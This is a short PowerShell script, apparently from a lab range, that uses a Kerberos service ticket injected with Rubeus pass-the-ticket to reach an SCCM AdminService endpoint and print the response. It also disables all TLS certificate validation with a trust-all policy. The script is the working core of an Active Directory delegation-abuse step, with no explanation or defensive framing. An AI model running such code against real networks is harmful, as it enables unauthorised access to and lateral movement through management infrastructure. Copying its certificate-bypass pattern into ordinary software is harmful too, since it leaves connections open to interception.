# Present the CD ST via .NET SSPI (UseDefaultCredentials) — run after Rubeus /ptt
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
Add-Type -TypeDefinition @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertPolicy : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint s, X509Certificate c, WebRequest r, int p) { return true; }
}
"@
[Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertPolicy
try {
    $r = Invoke-WebRequest -Uri 'https://mbr02.range.local/AdminService/wmi/SMS_Site' -UseDefaultCredentials -Method Get -TimeoutSec 30
    Write-Output ("IWR_STATUS=" + $r.StatusCode)
    Write-Output ("IWR_BODY=" + $r.Content.Substring(0, [Math]::Min(400, $r.Content.Length)))
} catch {
    Write-Output ("IWR_ERR=" + $_.Exception.Message)
    if ($_.Exception.InnerException) { Write-Output ("IWR_INNER=" + $_.Exception.InnerException.Message) }
}
Write-Output 'IWR_DONE'
